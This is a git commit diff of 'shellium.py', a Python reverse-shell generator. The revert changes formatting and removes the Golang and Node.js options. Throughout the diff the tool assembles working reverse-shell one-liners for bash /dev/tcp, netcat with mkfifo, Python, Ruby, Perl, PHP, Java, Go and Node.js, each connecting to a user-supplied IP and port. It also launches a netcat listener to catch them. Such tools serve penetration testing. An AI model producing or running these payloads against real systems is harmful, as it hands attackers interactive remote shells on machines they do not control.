e8844324908063f6ced83d7196bcbc77edb17cc6
K-S3curity <66269273+K-S3curity@users.noreply.github.com>
2021-06-07 23:29:02 +0000

    Revert "Update (07/06/2021)"
    This reverts commit 0764eb687744eefcfa356400d42e66e4a799cc50.

--- shellium.py
+++ shellium.py
@@ -1,5 +1,3 @@
-#!/usr/bin/python3
-
 from subprocess import call
 import os
 import socket
@@ -28,7 +26,7 @@ class ANSI():
 
     def blue_color():
         return "\33[94m"
-
+    
     def cyan_color():
         return "\33[36m"
 
@@ -36,59 +34,42 @@ class ANSI():
 # Reverse Shells
 
 def bash_rs():
-    print(ANSI.white_color() + "\nYou selected Bash Reverse Shell. Output : ")
-    bash = ANSI.yellow_color() + "bash -i >& /dev/tcp/" + \
-        ip_addr + "/" + port + " 0>&1"
+    print(ANSI.white_color() + "\n You selected JBash Reverse Shell. Output : ")
+    bash = ANSI.yellow_color() + "bash -i >& /dev/tcp/" + ip_addr + "/" + port + " 0>&1"
     print(bash)
 
-
 def netcat_rs():
-    print(ANSI.white_color() + "\nYou selected Netcat Reverse Shell. Output : ")
-    netcat = ANSI.yellow_color() + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-        ip_addr + " " + port + " >/tmp/f"
+    print(ANSI.white_color() + "\n You selected Netcat Reverse Shell. Output : ")
+    netcat = ANSI.yellow_color() + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip_addr + " " + port + " >/tmp/f"
     print(netcat)
 
-
 def python_rs():
-    print(ANSI.white_color() + "\nYou selected Python Reverse Shell. Output : ")
-    python = ANSI.yellow_color() + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + \
-        ip_addr + "\"," + port + \
-        "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    print(ANSI.white_color() + "\n You selected Python Reverse Shell. Output : ")
+    python = ANSI.yellow_color() + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_addr +"\"," + port +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     print(python)
 
-
 def python3_rs():
-    print(ANSI.white_color() + "\nYou selected Python3 Reverse Shell. Output : ")
-    python3 = ANSI.yellow_color() + "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + \
-        ip_addr + "\"," + port + \
-        "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    print(ANSI.white_color() + "\n You selected Python3 Reverse Shell. Output : ")
+    python3 = ANSI.yellow_color() + "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_addr +"\"," + port +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     print(python3)
 
-
 def ruby_rs():
-    print(ANSI.white_color() + "\nYou selected Ruby Reverse Shell. Output : ")
-    ruby = ANSI.yellow_color() + "ruby -rsocket -e'f=TCPSocket.open(\"" + ip_addr + \
-        "\"," + port + \
-        ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    print(ANSI.white_color() + "\n You selected Ruby Reverse Shell. Output : ")
+    ruby = ANSI.yellow_color() + "ruby -rsocket -e'f=TCPSocket.open(\"" + ip_addr + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
     print(ruby)
 
-
 def perl_rs():
-    print(ANSI.white_color() + "\nYou selected Perl Reverse Shell. Output : ")
-    perl = ANSI.yellow_color() + "perl -e 'use Socket;$i=\"" + ip_addr + "\";$p=" + port + \
-        ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    print(ANSI.white_color() + "\n You selected Perl Reverse Shell. Output : ")
+    perl = ANSI.yellow_color() + "perl -e 'use Socket;$i=\"" + ip_addr + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     print(perl)
 
-
 def php_rs():
-    print(ANSI.white_color() + "\nYou selected PHP Reverse Shell. Output : ")
-    php = ANSI.yellow_color() + "php -r '$sock=fsockopen(\"" + ip_addr + "\"," + \
-        port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    print(ANSI.white_color() + "\n You selected PHP Reverse Shell. Output : ")
+    php = ANSI.yellow_color() + "php -r '$sock=fsockopen(\"" + ip_addr + "\"," + port +");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
     print(php)
 
-
 def java_rs():
-    print(ANSI.white_color() + "\nYou selected Java Reverse Shell. Output : ")
+    print(ANSI.white_color() + "\n You selected Java Reverse Shell. Output : ")
     java = ANSI.yellow_color() + """r = Runtime.getRuntime()
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/""" + ip_addr + """/""" + port + """;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
@@ -96,28 +77,11 @@ def java_rs():
     print(java)
 
 
-def golang_rs():
-    print(ANSI.white_color() + "\nYou selected Golang Reverse Shell. Output : ")
-    golang = ANSI.yellow_color() + "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + ip_addr + ":" + \
-        port + \
-        "\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go"
-    print(golang)
-
-
-def nodeJs_rs():
-    print(ANSI.white_color() + "\nYou selected Node.js Reverse Shell. Output : ")
-    nodeJs = ANSI.yellow_color() + "require('child_process').exec('bash -i >& /dev/tcp/" + \
-        ip_addr + "/" + port + " 0>&1');"
-    print(nodeJs)
-
 # Reverse Shell generating menu & IP address verification
 
-
 global menu
-
-
 def menu():
-
+    
     # Clear screen
 
     if 'nt' in os.name:
@@ -135,86 +99,78 @@ def menu():
     6 - Perl Reverse Shell
     7 - PHP Reverse Shell
     8 - Java Reverse Shell
-    9 - Golang Reverse Shell
-    10 - Node.js Reverse Shell (Requires Bash on the target machine)
     Type "exit" to quit the program.
     """)
     choice = input("Enter a number to generate a Reverse Shell > ")
-
+    
     if choice == "exit":
-        print(ANSI.yellow_color() + "Quitting ...")
-        quit()
+            print("Quitting ...")
+            quit()
 
-    if not 0 < int(choice) <= 10:
+    if not 0 < int(choice) <= 8:
         print(ANSI.red_color() + "[-] Invalid choice !")
         quit()
-
+    
     global ip_addr
     global port
     ip_addr = input(ANSI.blue_color() + "[*] Enter your IP Address > ")
     port = input(ANSI.blue_color() + "[*] Enter a port number > ")
+    
 
     def check_ipv4_address():
         parts = ip_addr.split('.')
         if len(parts) != 4:
-            print(ANSI.red_color() +
-                  "[-] Invalid IPv4 Address ! The format must be like ; a.b.c.d")
+            print(ANSI.red_color() + "[-] Invalid IPv4 Address ! The format must be like ; a.b.c.d")
             quit()
         if '' in parts or ' ' in parts:
-            print(ANSI.red_color(
-            ) + "[-] Invalid IPv4 Address ! No spaces or blank caracters allowed.")
+            print(ANSI.red_color() + "[-] Invalid IPv4 Address ! No spaces or blank caracters allowed.")
             quit()
         for item in parts:
             if not item.isnumeric():
-                print(ANSI.red_color() +
-                      "[-] Invalid IPv4 Address ! No special caracters allowed.")
+                print(ANSI.red_color() + "[-] Invalid IPv4 Address ! No special caracters allowed.")
                 quit()
 
         invalid = ['000', '001', '002', '003', '004', '005', '006', '007', '008', '009',
-                   '010', '011', '012', '013', '014', '015', '016', '017', '018', '019',
-                   '020', '021', '022', '023', '024', '025', '026', '027', '028', '029',
-                   '030', '031', '032', '033', '034', '035', '036', '037', '038', '039',
-                   '040', '041', '042', '043', '044', '045', '046', '047', '048', '049',
-                   '050', '051', '052', '053', '054', '055', '056', '057', '058', '059',
-                   '060', '061', '062', '063', '064', '065', '066', '067', '068', '069',
-                   '070', '071', '072', '073', '074', '075', '076', '077', '078', '079',
-                   '080', '081', '082', '083', '084', '085', '086', '087', '088', '089',
+                   '010', '011', '012', '013', '014', '015', '016', '017', '018', '019', 
+                   '020', '021', '022', '023', '024', '025', '026', '027', '028', '029', 
+                   '030', '031', '032', '033', '034', '035', '036', '037', '038', '039', 
+                   '040', '041', '042', '043', '044', '045', '046', '047', '048', '049', 
+                   '050', '051', '052', '053', '054', '055', '056', '057', '058', '059', 
+                   '060', '061', '062', '063', '064', '065', '066', '067', '068', '069', 
+                   '070', '071', '072', '073', '074', '075', '076', '077', '078', '079', 
+                   '080', '081', '082', '083', '084', '085', '086', '087', '088', '089', 
                    '090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
         for item in parts:
             if item == item in invalid:
-                print(ANSI.red_color(
-                ) + "[-] Invalid IPv4 address ! Zeros are not allowed at the beginning of the numbers")
+                print(ANSI.red_color() + "[-] Invalid IPv4 address ! Zeros are not allowed at the beginning of the numbers")
                 quit()
-
+    
         if 0 <= int(parts[0]) <= 255 and 0 <= int(parts[1]) <= 255 and 0 <= int(parts[2]) <= 255 and 0 <= int(parts[3]) <= 255:
-            print(ANSI.green_color() + "[+] " +
-                  ip_addr + " is a valid IPv4 address")
+            print(ANSI.green_color() + "[+] " + ip_addr + " is a valid IPv4 address")
             check_port()
-
+    
         else:
-            print(ANSI.red_color() +
-                  "[-] Invalid IPv4 Address ! The allowed port range is : 0 - 255")
+            print(ANSI.red_color() + "[-] Invalid IPv4 Address ! The allowed port range is : 0 - 255")
             quit()
+
 
     def check_ipv6_address(ip_addr):
         try:
             socket.inet_pton(socket.AF_INET6, ip_addr)
-            print(ANSI.green_color() + "[+] " +
-                  ip_addr + " is a valid IPv6 address")
+            print(ANSI.green_color() + "[+] " + ip_addr + " is a valid IPv6 address")
             check_port()
 
         except socket.error:
             print(ANSI.red_color() + "[-] Invalid IPv6 address !")
             quit()
 
+
     def check_port():
-        if not port.isnumeric():
-            print(ANSI.red_color(
-            ) + "[-] Invalid Port ! No spaces or blank/special caracters allowed.")
+        if not port.isnumeric() :
+            print(ANSI.red_color() + "[-] Invalid Port ! No spaces or blank/special caracters allowed.")
             quit()
         elif not 0 <= int(port) <= 65535:
-            print(ANSI.red_color() +
-                  "[-] Invalid Port ! The allowed port range is : 0 - 65535")
+            print(ANSI.red_color() + "[-] Invalid Port ! The allowed port range is : 0 - 65535")
             quit()
         else:
             print(ANSI.green_color() + "[+] " + port + " is a valid port")
@@ -241,16 +197,12 @@ def menu():
         php_rs()
     elif choice == 8:
         java_rs()
-    elif choice == 9:
-        golang_rs()
-    elif choice == 10:
-        nodeJs_rs()
-
+    
 
 # Shellium's main menu
 
 def main_menu():
-    # Clear the screen
+    #Clear the screen
 
     if 'nt' in os.name:
         call("cls")
@@ -269,50 +221,41 @@ def main_menu():
     except KeyboardInterrupt:
         print(ANSI.yellow_color() + "\nProcess manually aborted by user")
         quit()
-
-    # Netcat Listener
+    
+    # Netcat Listener 
 
     def listen():
         try:
-            try:
-                port = input("Specify a local port > ")
-            except KeyboardInterrupt:
-                print("\nProcess manually aborted by user")
-                quit()
+            port = input("Specify a local port > ")
             if not 0 <= int(port) <= 65535:
-                print(ANSI.red_color() +
-                      "[-] Invalid port ! The allowed port range is 0-65535")
+                print(ANSI.red_color() + "[-] Invalid port ! The allowed port range is 0-65535")
                 quit()
             if not 1024 <= int(port):
                 print(ANSI.yellow_color() + "You've entered a port number below 1024. Ports between 0 and 1024 are reserved to daemons (System services). \nTo listen on the port you specified, you must run Shellium as root.")
-                port = input(ANSI.white_color() +
-                             "Change port number ? y/N > ")
+                port = input(ANSI.white_color() + "Change port number ? y/N > ")
                 if port == "y" or port == "Y":
                     port = input("Specify a local port > ")
                     if not 1024 <= int(port) <= 65535:
-                        print(ANSI.yellow_color() +
-                              "\nRe-run Shellium as root to continue")
+                        print(ANSI.yellow_color() + "\nRe-run Shellium as root to continue")
                         print(ANSI.yellow_color() + "Quitting ...")
                         quit()
                 elif port == "N" or port == "n":
-                    print(ANSI.yellow_color() +
-                          "\nRe-run Shellium as root to continue")
+                    print(ANSI.yellow_color() + "\nRe-run Shellium as root to continue")
                     print(ANSI.yellow_color() + "Quitting ...")
                     quit()
                 else:
-                    print(ANSI.red_color() +
-                          "[-] Invalid entry ! Quitting ...")
+                    print(ANSI.red_color() + "[-] Invalid entry ! Quitting ...")
                     quit()
-
+            
             nc = "nc -nlvp" + port
         except KeyboardInterrupt:
             print(ANSI.yellow_color() + "\nProcess manually aborted by user")
-
+        
         try:
-            ANSI.green_color(call(nc, shell=True))
+            ANSI.green_color(call(nc,shell=True))
         except KeyboardInterrupt:
             print(ANSI.yellow_color() + "\nProcess manually aborted by user")
-
+    
     def generate():
         try:
             menu()
@@ -326,6 +269,5 @@ def main_menu():
     else:
         print(ANSI.red_color() + "[-] Invalid option ! Please choose 1/2.")
         quit()
-
 
 main_menu()
